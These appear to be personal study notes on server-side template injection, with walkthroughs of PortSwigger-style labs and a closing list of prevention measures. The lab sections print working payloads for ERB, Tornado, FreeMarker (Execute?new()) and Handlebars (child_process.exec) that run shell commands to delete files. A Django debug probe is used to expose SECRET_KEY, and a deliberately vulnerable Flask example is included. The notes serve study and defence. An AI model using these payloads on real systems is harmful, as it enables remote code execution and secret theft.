## Basics
Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed **server-side**.

Websites use templates such as [FreeMarker](https://freemarker.apache.org/) to embed dynamic content in web pages. In the below code we can notice that the `name` parameter of the user's request directly being passed into the template using the `render` function.

```python fold
from flask import Flask, request, render_template_string
# Creates a new Flask application instance
app = Flask(__name__)
@app.route('/')
def home():
    # Get user input from URL parameter
    name = request.args.get('name', 'Guest')
    # Vulnerable template - directly inserts user input
    template = f'''
    <h1>Hello, {name}!</h1>
    <p>Welcome to our website.</p>
    '''
    # Renders the template
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True)
```
Check the `name` parameter and how the `flask renders templates` in the data:
![[file-20250507201809139.png]]
![[file-20250507201744011.png]]
![[file-20250507202721598.png]]
[**Identifications by payloads**](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*35XwCGeYeKYmeaU8rdkSdg.jpeg)
## Labs
### Basic server-side template injection (ERB SSTI)
[SecurityExplained/resources/ruby-erb-ssti.md at main · harsh-bothra/SecurityExplained](https://github.com/harsh-bothra/SecurityExplained/blob/main/resources/ruby-erb-ssti.md)

![[file-20250507232759029.png]]
Now going to the [ERB documentation](https://docs.ruby-lang.org/en/2.3.0/ERB.html) we find out the following tags:
```ruby
<%= Ruby expression -- replace with result %>
```

So the payload becomes `<%= 7*7 %>` 
![[file-20250507233133745.png]]
So from the documentation we can find that the `system` command let's us run commands on the remote server.
![[file-20250507233818976.png]]
So now we just need to change the `message` parameter's value to `/?message=<%=+system("rm /home/carlos/morale.txt")+%>` to delete the required file.
### Basic server-side template injection (code context)
Notice, the POST request sets the value of the `blog-post-author-display` to either `user.name`, `user.first_name`, or `user.nickname`. [Tornado template](https://www.tornadoweb.org/en/stable/template.html) uses the syntax `{{something}}`

Escape out of the expression using `blog-post-author-display=user.name}}{{7*7}}` and on reloading it shows all the usernames i.e. `Peter Wiener49}}` 

Now to run Python, use the syntax `{{% some python code %}}`
```python
import os
os.system('rm /home/carlos/morale.txt')
```

Now the final payload that goes into the parameter goes like `blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`.
### Server-side template injection using documentation
This lab uses the syntax `${something}` so we try `${7*7}` and that confirms the SQL Injection.

The `new()` built-in function in FreeMarker is particularly noteworthy for security reasons. This function allows templates to instantiate Java classes directly using syntax like `"com.example.SomeClass"?new()`. While this capability is useful for Freemarker Template libraries with Java implementations, it presents significant security risks:

1. Though `new()` is meant to only instantiate classes that implement `TemplateModel`, FreeMarker contains built-in `TemplateModel` classes that could be leveraged to create arbitrary Java objects.
2. Even for classes that don't implement `TemplateModel`, their static initialization code would still run, potentially causing security issues.
3. Malicious templates could use this functionality to instantiate dangerous classes that exist in your application's classpath.

FreeMarker is one of the most popular Java template languages, and the language I've seen exposed to users most frequently. This makes it surprising that the official website explains the dangers of allowing user-supplied templates:

> 23. Can I allow users to upload templates and what are the security implications?
> 
> In general you shouldn't allow that, unless those users are system administrators or other trusted personnel. Consider templates as part of the source code just like *.java files are. If you still want to allow users to upload templates, here are what to consider:
> 
> - http://freemarker.org/docs/app_faq.html#faq_template_uploading_security

Buried behind some lesser risks like Denial of Service, we find this:

The `new` built-in (`Configuration.setNewBuiltinClassResolver`, `Environment.setNewBuiltinClassResolver`): It's used in templates like `"com.example.SomeClass"?new()`, and is important for FTL libraries that are partially implemented in Java, but shouldn't be needed in normal templates. While new will not instantiate classes that are not `TemplateModel`-s, FreeMarker contains a `TemplateModel` class that can be used to create arbitrary Java objects. Other "dangerous" `TemplateModel`-s can exist in you class-path. Plus, even if a class doesn't implement `TemplateModel`, its static initialization will be run. To avoid these, you should use a `TemplateClassResolver` that restricts the accessible classes (possibly based on which template asks for them), such as `TemplateClassResolver.ALLOWS_NOTHING_RESOLVER`.

This warning is slightly cryptic, but it does suggest that the `new` builtin may offer a promising avenue of exploitation. Let's have a look at the documentation on `new`:

> This built-in can be a security concern because the template author can create arbitrary Java objects and then use them, as far as they implement TemplateModel. Also the template author can trigger static initialization for classes that don't even implement TemplateModel. [snip] If you are allowing not-so-much-trusted users to upload templates then you should definitely look into this topic.
> 
> - http://freemarker.org/docs/ref_builtins_expert.html#ref_builtin_new

![[file-20250508225106633.png]]
One of these class names stands out - `Execute`.
The details confirm it does what you might expect - takes input and executes it:

> public class **Execute**
> implements TemplateMethodModel  
  
Given FreeMarker the ability to execute external commands. Will fork a process, and inline anything that process sends to stdout in the template.

![[file-20250508221208203.png]]
![[file-20250508222709453.png]]
![[file-20250508222744730.png]]
Now we can delete the `morale.txt` file using 
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")}
```
### Server-side template injection in an unknown language with a documented exploit
Fuzzed the `GET` request with the SSTI payloads and got error.
![[file-20250508231628586.png]]
```java
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
After URL encoding the above payload and sending a `GET` request to the server we get this.
![[file-20250508231215523.png]]
Now to delete the payload the just URL encode the payload after changing the command.
```java
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
After URL encoding the payload
```
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d
```
### Server-side template injection with information disclosure via user-supplied objects
Fuzz and find the following payload works in the field edit template of the product:  `{% debug %}`
![[file-20250508232740156.png]]
Studying the settings option from the [django documentation](https://docs.djangoproject.com/en/5.1/ref/settings/#secret-key) there is `SECRET_KEY` option that provides [cryptographic signing](https://docs.djangoproject.com/en/5.1/topics/signing/).
![[file-20250508232537056.png]]
### Server-side template injection in a sandboxed environment

![[file-20250508235107128.png]]
Notice that we don't have an article object so we reference the product object of the Java class.
![[file-20250508235137426.png]]
![[file-20250508235202845.png]]

![[file-20250508235245339.png]]
Now do it the portswigger way by nesting all the `Java classes`
![[file-20250508234243672.png]]
![[file-20250508234414239.png]]
###
## Prevention
- Logic-less template engines ([Mustache](https://mustache.github.io/), [Handlebars](https://handlebarsjs.com/)) prevent code execution by supporting only variable substitution without logic statements, filters, or method calls, making them inherently resistant to SSTI attacks.
- Context-specific output encoding neutralizes template syntax by applying appropriate encoding (HTML, JavaScript, CSS, etc.) based on where user input appears in the application.
- Input validation should reject or sanitize inputs containing template delimiters like `{{`, `{%`, `<%` before they reach template processing.
- Template sandboxing configures engines with restricted environments using features like **Jinja2's** `SandboxedEnvironment` or **Twig's** sandbox extension to limit accessible objects and methods.
- **Containerization** isolates template rendering in `Docker` containers with minimal privileges: no network access, read-only filesystems, memory/CPU limits, and restricted system calls.
- Template engine configurations should `disable dangerous features`: eval functions, filesystem access, module imports, and auto-escaping bypass mechanisms.
- `Pre-compiling` templates during build/deployment rather than runtime prevents user input from influencing the template compilation process.
- Using separate rendering contexts for system templates vs. user-provided templates prevents user templates from accessing sensitive application objects.
## References
- [Template Engines Injection 101](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)